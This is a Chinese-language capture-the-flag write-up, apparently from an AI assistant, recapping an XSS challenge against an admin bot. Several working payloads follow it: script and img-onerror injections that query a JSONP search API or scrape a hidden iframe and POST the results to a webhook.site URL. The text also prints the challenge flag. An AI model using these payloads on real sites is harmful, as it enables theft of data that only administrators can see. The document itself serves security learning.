恭喜你！🎉 成功拿到 Flag！

这就为你复盘整道题目的解题全过程。这是一道非常典型的 **XSS (跨站脚本攻击)** 结合 **前端逻辑审计** 的题目，过程跌宕起伏，非常有教育意义。

---

### 📝 题目复盘：博丽神社的绘马挂

#### 1. 题目分析 (Reconnaissance)

- **入口点**：一个发布愿望（绘马）的输入框。
    
- **关键功能**：
    
    - **XSS 漏洞**：经过初步测试，确认输入框存在 XSS 漏洞，支持执行 JavaScript。
        
    - **Bot 触发器**：有一个 `[ ] 悄悄话` 选项。勾选后，后台的管理员 Bot (灵梦) 会模拟浏览器访问查看你的愿望。这意味着我们需要利用 XSS 窃取 Bot 看到的信息。
        
- **目标**：获取只有管理员能看到的 Flag。
    

#### 2. 攻击演进过程 (Exploitation Steps)

**阶段一：初探与踩坑 (获取页面源码)**

- **思路**：Flag 通常藏在管理员的私有页面里，猜测是 `/archives.html`（归档页面）。
    
- **Payload 1**：尝试直接 `fetch('/archives.html')` 并回传。
    
- **遇到的问题**：
    
    1. **中文编码报错**：页面包含中文字符，导致 `btoa()` 编码失败。**解决**：使用 `encodeURIComponent`。
        
    2. **URI Too Large**：页面源码太长，通过 URL 参数 (`GET`) 发送导致 Nginx 报错 414。**解决**：改为 `POST` 请求发送数据。
        
- **结果**：成功拿到了 `archives.html` 的 HTML 源码。
    

**阶段二：源码审计 (Code Review)**

- **发现**：拿到的 HTML 里全是空的 `<div>`，并没有 Flag。
    
- **分析**：查看源码中的 `<script>` 标签，发现页面是**前后端分离**（CSR）的逻辑：
    
    JavaScript
    
    ```
    async function loadArchives() {
        const msgs = await apiCall('/archives'); // 关键：数据是通过 API 异步加载的
        // ...
    }
    ```
    
- **结论**：攻击不能只抓页面 HTML，必须模拟浏览器去请求**数据接口**。
    

**阶段三：深入 API (The Twist)**

- **思路**：构造 XSS 脚本，直接调用 `apiCall('/archives')` 接口并将 JSON 数据发回 Webhook。
    
- **结果**：Webhook 收到了请求，但数据是 `[]` (空数组)。
    
- **分析**：这说明管理员的“默认归档列表”是空的。Flag 被隐藏了，不在列表里直接显示。
    

**阶段四：绝杀 (利用搜索功能)**

- **再次审计**：回到源码，发现了一个 `doSearch()` 函数，它调用了 `/search` 接口：
    
    JavaScript
    
    ```
    script.src = `${API_BASE}/search?q=${encodeURIComponent(query)}&callback=${cbName}`;
    ```
    
- **推测**：既然列表里没有，Flag 可能需要通过**搜索**才能找到。Flag 的格式通常是 `Hgame{...}`。
    
- **最终 Payload**：
    
    构造一个脚本，利用页面自带的逻辑或直接请求 API，搜索关键词 `"Hgame"`，并将结果回传。
    

#### 3. 最终解法代码 (The Solution)

你在最后使用的 Payload 核心逻辑如下：

JavaScript

```
// 1. 定义接收数据的回调
window.stealFlag = function(data) {
    fetch('https://webhook.site/你的UUID', {
        method: 'POST',
        body: JSON.stringify(data) // 发送搜索到的 JSON
    });
};

// 2. 动态插入 Script 标签触发 JSONP 搜索接口
var s = document.createElement('script');
// 搜索关键词 "Hgame"
s.src = (typeof API_BASE !== 'undefined' ? API_BASE : '/api') + '/search?q=Hgame&callback=stealFlag';
document.body.appendChild(s);
```

#### 4. 获取 Flag (Capture The Flag)

根据你最后一张截图 (`image_0e8942.jpg`)，Webhook 收到的数据如下：

JSON

```
{
  "content": "The_Secr4t_Is: Hgame{TH3_SecR4t_of-h4KuRe1_j1nj4S4f9fc}",
  "id": 3001,
  "is_private": true,
  "status": "archived",
  "username": "Reimu"
}
```

**🚩 Flag:**

`Hgame{TH3_SecR4t_of-h4KuRe1_j1nj4S4f9fc}`

---

### 🧠 核心知识点总结

这道题考察了几个非常重要的 Web 安全知识点：

1. **XSS Bot 交互**：如何构造 Payload 让后台爬虫执行并回传数据。
    
2. **数据回传技巧**：
    
    - 处理中文编码 (`encodeURIComponent`).
        
    - 绕过长度限制 (改用 `POST`).
        
    - 绕过 CORS (虽然题目环境可能没开 CORS 限制，但利用 `<script>` 标签或 `img` 标签是常用手段)。
        
3. **静态 vs 动态网页**：明白 `view-source` 看到的 HTML 和浏览器 `Inspect` 看到的 DOM 是不一样的。攻击者需要通过 JS 去获取动态渲染的数据（API）。
    
4. **功能点挖掘**：当默认路径（列表）走不通时，要学会审计代码，寻找其他交互接口（如搜索 Search），这往往是隐藏 Flag 的地方。
    

做得很棒！每一步的排查思路都很清晰。继续加油！

```js
<script>
  // 1. 定义一个回调函数来接收搜索结果
  window.stealFlag = function(data) {
    // 把搜索到的结果 (JSON格式) 发送到你的 Webhook
    fetch('https://webhook.site/bf26c090-6ca1-4465-8afc-0e3152d5c0e4', {
      method: 'POST',
      mode: 'no-cors',
      body: 'FOUND_FLAG: ' + JSON.stringify(data)
    });
  };

  // 2. 构造搜索脚本
  // 尝试使用页面已有的 API_BASE 变量，如果没有就猜是 /api
  var apiBase = (typeof API_BASE !== 'undefined') ? API_BASE : '/api';
  
  var s = document.createElement('script');
  // 关键：搜索关键词 "Hgame" (或者是 "flag")
  // 并且指定 callback 为我们上面定义的 stealFlag 函数
  s.src = apiBase + '/search?q=Hgame&callback=stealFlag';
  
  // 3. 插入脚本触发搜索
  document.body.appendChild(s);
</script>
```


```js
<iframe id="hack-frame" src="/archives.html" style="display:none"></iframe>

<img src=x onerror="
  // 2. 设置延时，给 iframe 里面的 JS 留出 2 秒钟的时间去加载 Flag
  setTimeout(function() {
    try {
        // 3. 提取 iframe 里的 HTML 内容 (这时候 Flag 应该已经渲染在里面了)
        var stolenContent = document.getElementById('hack-frame').contentDocument.body.innerHTML;
        
        // 4. 将内容 POST 发送到你的 Webhook
        fetch('https://webhook.site/bf26c090-6ca1-4465-8afc-0e3152d5c0e4', {
            method: 'POST',
            mode: 'no-cors',
            body: stolenContent
        });
    } catch(e) {
        // 报错回传
        new Image().src = 'https://webhook.site/bf26c090-6ca1-4465-8afc-0e3152d5c0e4?error=' + e;
    }
  }, 2000); // 等待 2000 毫秒
">
```
页面源码反射

获取归档数据
```js
<img src=x onerror="
  // 尝试利用网站自带的 apiCall 函数直接获取数据
  apiCall('/archives')
    .then(data => {
      // 成功！把拿到的 JSON 数据 (里面应该有 Flag) 转成文本
      var jsonString = JSON.stringify(data);
      
      // 用 POST 发送到你的 Webhook
      fetch('https://webhook.site/bf26c090-6ca1-4465-8afc-0e3152d5c0e4', {
        method: 'POST',
        mode: 'no-cors',
        body: jsonString
      });
    })
    .catch(err => {
        // 如果 apiCall 失败，尝试备用方案：直接 fetch 接口
        // 假设 API_BASE 变量存在（源码里看到了）
        var apiUrl = (typeof API_BASE !== 'undefined' ? API_BASE : '/api') + '/archives';
        fetch(apiUrl).then(r => r.text()).then(t => {
            fetch('https://webhook.site/bf26c090-6ca1-4465-8afc-0e3152d5c0e4', {
                method: 'POST',
                mode: 'no-cors',
                body: t
            });
        });
    });
">
```

https://webhook.site/bf26c090-6ca1-4465-8afc-0e3152d5c0e4